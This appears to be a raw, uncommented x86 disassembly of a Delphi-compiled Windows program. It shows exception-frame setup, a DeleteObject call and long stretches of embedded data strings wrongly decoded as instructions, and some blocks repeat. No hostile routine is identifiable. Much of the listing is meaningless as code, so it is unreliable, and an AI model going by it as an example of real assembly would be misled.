add [ eax ] al
xchg [ fs : edi ] al
inc esp
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
xchg [ fs : edi ] al
inc esi
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi - 0x1 ] al
add [ eax ] al
xchg [ fs : edi ] al
dec eax
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx - 0x1 ] cl
add [ eax ] al
xchg [ fs : edi ] al
dec edx
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx - 0x1 ] cl
add [ eax ] al
xchg [ fs : edi ] al
dec esp
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
xchg [ fs : edi ] al
dec esi
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi - 0x1 ] cl
add [ eax ] al
xchg [ fs : edi ] al
xor bh bh
add [ eax ] al
xchg [ fs : edi ] al
xor edi edi
add [ eax ] al
xchg [ fs : edi ] al
xor bh bh
add [ eax ] al
xchg [ fs : edi ] al
xor edi edi
add [ eax ] al
xchg [ fs : edi ] al
xor al 0xff
add [ eax ] al
xchg [ fs : edi ] al
xor eax 0x640000ff
xchg [ edi ] al
inc [ ss : eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
xchg [ fs : edi ] al
cmp eax 0x640000ff
xchg [ edi ] al
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_421ff1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421ff8
retn
sub_422004
or [ eax ] ah
inc edx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
push 0x4220
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20 ] ch
inc edx
add [ eax + eax ] cl
add [ eax ] al
and [ eax + 0x40 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl sp ax
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ eax ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
and [ eax + 0x40 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
je r-xdata
outsd
outsb
lea eax [ eax ]
in al 0x20
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
cmp [ ecx ] ah
inc edx
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
push esp
and [ edx ] eax
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add al ah
and [ edx ] al
or [ esi + 0x70 ] esp
inc esp
popa
jne r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax ] ah
and al [ edx ]
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
and [ edx ] eax
mov eax eax
mov esp 0x3004221
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
push eax
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x21 ] dl
inc edx
add [ esi ] al
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x21a4c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x7004221 ] bh
jo r-xdata
outsd
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push eax
and [ edx ] eax
push es
popad
jb r-xdata
pop es
bound esi [ ebx + 0x53 ]
outsd
insb
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
int3
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x42222490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
shl al 0x22
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x42212890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add ah bl
and al [ edx ]
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
insb
inc ecx
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
mov eax [ ecx ]
push esp
mov [ ecx ] es
pop esp
mov [ ecx ] es
jo r-xdata
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] al
add [ esp + ebx * 2 ] ah
inc edx
add [ eax ] bl
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
loopne r-xdata
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
jo r-xdata
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
outsb
je r-xdata
inc edi
jb r-xdata
xor eax 0x540f0042
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
inc edx
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x22e0c08b
dec ebp
jb r-xdata
add [ ebx ] al
outsb
add [ eax ] al
hlt
imul esp [ ebx + 0x73 ] 0xffff0001
nop
js r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ecx * 8 + 0x23 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004223 ] bh
insb
nop
inc edi
outsd
popad
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax ] al
pop eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x24a80042 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x61ffbddc ] dl
test al 0x24
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + 0x23 ] si
inc edx
add [ eax + 0x415c ] bl
add [ eax ] cl
inc edi
jb r-xdata
push [ ebp + esi + 0x540f0042 ]
jo r-xdata
and al 0x42
add [ eax + eax ] ah
sahf
jo r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x23
inc edx
imul esp [ ebx + 0x73 ] 0x4223a490
and eax [ edx ]
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
les edi [ eax ]
inc edx
add [ esp + ecx * 4 + 0x41 ] dl
add [ esp + ecx * 4 + 0x41 ] bl
add [ eax ] cl
cmp [ edx ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
and eax [ edx ]
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
imul esp [ ebx + 0x73 ] 0xc08b0000
clc
and eax [ edx ]
sub_4225ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x26
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ eax + eax ] bl
add [ eax ] al
pop eax
and eax [ edx ]
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
loopne r-xdata
xor [ edi ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc edx
add [ esp + ecx * 4 + 0x41 ] dl
add [ esp + ecx * 4 + 0x41 ] bl
add [ eax ] cl
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
or al 0x26
inc edx
add [ edi ] al
add al 0x54
push eax
outsb
hlt
inc edx
add [ eax + eax * 2 ] al
inc edx
add [ eax + eax * 2 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
xor al 0x40
inc edx
add [ eax + eax * 2 ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x26f4c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x23 ] bl
inc edx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
test al 0x40
inc edx
add [ esp + ecx * 4 + 0x41 ] dl
add [ esp + ecx * 4 + 0x41 ] bl
add al dl
inc eax
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
and al [ edx ]
sbb [ eax ] al
add bh bh
add [ eax ] al
jae r-xdata
jns r-xdata
jae r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
daa
nop
or al 0x27
inc edx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add al 0x24
retn
outsd
movsb [ edi ] gs : [ esi ]
and al 0x42
add [ eax + eax ] cl
add bh bh
inc edx
add [ esp + ecx * 4 + 0x41 ] dl
add [ esp + ecx * 4 + 0x41 ] bl
add [ eax - 0x75 ] dh
inc ecx
add ah cl
dec ebx
inc edx
add [ eax - 0x13ffbdb5 ] bh
dec edx
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc esp
daa
inc edx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add al dl
daa
inc edx
add [ eax ] bl
add [ eax ] al
and al 0x5c
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
jae r-xdata
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
inc edx
add [ eax ] dl
add [ eax ] al
jmp [ eax + 0x1004249 ]
nop
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
fsub [ edi ]
hlt
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0x44
daa
inc edx
add [ eax + 0x400415c ] bl
add [ eax ] cl
inc edi
jb r-xdata
outsd
outsb
je r-xdata
add [ edx ] 0x0
add al 0x46
jo r-xdata
imul esp [ ebx + 0x73 ] 0x27080004
inc edx
add [ eax + eax ] dl
add bh bh
lodsb [ esi ]
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
add al 0xdc
jmp r-xdata
dec ebp
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4228f4
into
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x4229
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffbdd7 ] ah
sub [ edx ] eax
sub [ eax ] al
add [ eax ] al
adc al 0x5d
inc ecx
add [ ebx + esi - 0x72ebffc0 ] ah
inc ecx
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
mov eax [ ecx ]
push esp
mov [ ecx ] es
insb
pushad
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ ebp + ecx * 4 + 0x5ffc0041 ] ah
inc edx
add [ eax - 0x47ffbfd7 ] ch
pushad
inc edx
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
add [ edx + 0x42 ] ah
add [ edx ] al
inc edx
add [ eax - 0x7bffbfd7 ] ch
bound eax [ edx ]
test al 0x29
inc eax
add al ch
bound eax [ edx ]
in al dx
bound eax [ edx ]
test al 0x29
inc eax
add ah bh
bound eax [ edx ]
les ebx [ edi + 0x42 ]
add [ eax ] cl
bound eax [ edx ]
nop
bound eax [ edx ]
test al 0x29
inc eax
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
test al 0x29
inc eax
add [ ecx ] al
add ch bh
[ edx + 0x42 ]
add [ eax ] cl
push esp
inc edi
jb r-xdata
inc eax
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
or al 0x31
jo r-xdata
mov [ edx ] eax
js r-xdata
add al cl
ja r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
test al 0x29
inc eax
add [ esp + edx * 2 ] cl
add [ ecx + esi ] cl
imul esp [ ebx - 0x73 ] 0x29b80040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add [ eax - 0x1fffbd77 ] dh
inc edx
ja r-xdata
add [ eax ] cl
js r-xdata
push ebx
push 0x64657261
dec ecx
or al 0x54
imul esp [ ebx + 0x3c ] 0x98004229
pop ebp
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
mov [ edx ] eax
or dl [ ecx + ecx * 2 + 0x63 ]
outsd
outsb
dec ecx
insd
popad
nop
sub [ edx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sub eax [ edx ]
sbb [ eax ] al
add [ eax ] al
fsubr [ ecx ]
inc edx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
mov al 0x89
inc edx
add al ah
add [ ebx + eax * 4 ] dl
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x422b6070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x422ae470
add [ ecx + ebp + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add al bl
ja r-xdata
add [ edx ] al
inc edx
add [ eax + edi * 2 + 0x42 ] ah
add [ eax + 0x7c ] dl
inc edx
add [ esp + eax * 4 + 0x42 ] cl
add [ eax ] ah
test [ edx ] eax
in al dx
bound eax [ edx ]
hlt
insd
popad
lea eax [ bx + si ]
test [ edx ] ch
jo r-xdata
xor edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422c ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x340042 ] cl
add [ eax ] al
[ edx ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
adc al 0x8d
inc ecx
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
dec esp
mov al [ edx ]
push esp
mov [ ecx ] es
insb
pushad
inc edx
add [ edx + ecx * 4 + 0x42 ] bh
add [ ebp + ecx * 4 + 0x5ffc0041 ] ah
inc edx
add ah bl
mov al [ edx ]
mov eax 0x1c004260
mov eax [ edx ]
dec eax
mov eax [ edx ]
add [ edx + 0x42 ] ah
add [ edx ] al
inc edx
add [ ebx + ecx * 4 + 0x42 ] bl
add [ edx - 0x721fffbe ] al
inc edx
add al ch
bound eax [ edx ]
clc
lea eax [ edx ]
cld
lea eax [ edx ]
cld
bound eax [ edx ]
clc
mov [ edx ] eax
or [ edx + 0x42 ] ah
add [ eax - 0x63ffbd9e ] dl
mov [ edx ] es
adc al 0x8e
inc edx
add [ esi + ecx * 4 ] bh
inc edx
add [ eax - 0x72 ] dl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
cwde
sub al 0x42
add [ edi ] al
add eax 0x6f634954
outsb
sub [ edx + eax * 2 ] ch
add [ ecx + ebp + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
int3
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7400422a ] cl
add [ eax ] al
add al bl
sub [ edx ] eax
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
in al 0x66
inc edx
add [ eax + 0x67 ] al
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
in al 0x2a
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2b ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x42 ] dl
add [ eax + eax ] bh
add [ eax ] al
[ edx ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
adc al 0x8d
inc ecx
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
shl [ ecx + 0x42 ] 0x1
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0x42 ] ch
add [ edx + esi * 2 ] cl
inc edx
add [ ebp + ecx * 4 + 0x73e00041 ] ah
inc edx
add [ eax + 0x74 ] ah
inc edx
add [ eax + 0x14004260 ] bh
ja r-xdata
imul esp [ ebx + 0x73 ] 0x24900000
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx ] ch
inc edx
add [ eax ] cl
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
call sub_403510
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422b25
test [ edx ] eax
dec eax
xchg [ edx ] al
push 0x8004271
bound eax [ edx ]
nop
bound eax [ edx ]
sub al 0x7b
inc edx
add [ eax ] cl
mov [ edx ] eax
test al 0x7a
inc edx
add [ eax ] dl
mov [ edx ] eax
js r-xdata
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add [ eax - 0x1fffbd77 ] dh
inc edx
add al bl
ja r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
mov [ edx ] eax
or dl [ ecx + ecx * 2 + 0x63 ]
outsd
outsb
dec ecx
insd
popad
nop
sub [ edx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sub eax [ edx ]
sbb [ eax ] al
add [ eax ] al
fsubr [ ecx ]
inc edx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
mov al 0x89
inc edx
add al ah
add [ ebx + eax * 4 ] dl
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x422b6070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x422ae470
add [ ecx + ebp + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
xor edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422c ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x340042 ] cl
add [ eax ] al
[ edx ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
adc al 0x8d
inc ecx
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
dec esp
mov al [ edx ]
push esp
mov [ ecx ] es
insb
pushad
inc edx
add [ edx + ecx * 4 + 0x42 ] bh
add [ ebp + ecx * 4 + 0x5ffc0041 ] ah
inc edx
add ah bl
mov al [ edx ]
mov eax 0x1c004260
mov eax [ edx ]
dec eax
mov eax [ edx ]
add [ edx + 0x42 ] ah
add [ edx ] al
inc edx
add [ ebx + ecx * 4 + 0x42 ] bl
add [ edx - 0x721fffbe ] al
inc edx
add al ch
bound eax [ edx ]
clc
lea eax [ edx ]
cld
lea eax [ edx ]
cld
bound eax [ edx ]
clc
mov [ edx ] eax
or [ edx + 0x42 ] ah
add [ eax - 0x63ffbd9e ] dl
mov [ edx ] es
adc al 0x8e
inc edx
add [ esi + ecx * 4 ] bh
inc edx
add [ eax - 0x72 ] dl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
cwde
sub al 0x42
add [ edi ] al
add eax 0x6f634954
outsb
sub [ edx + eax * 2 ] ch
add [ ecx + ebp + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
int3
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
call sub_403510
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
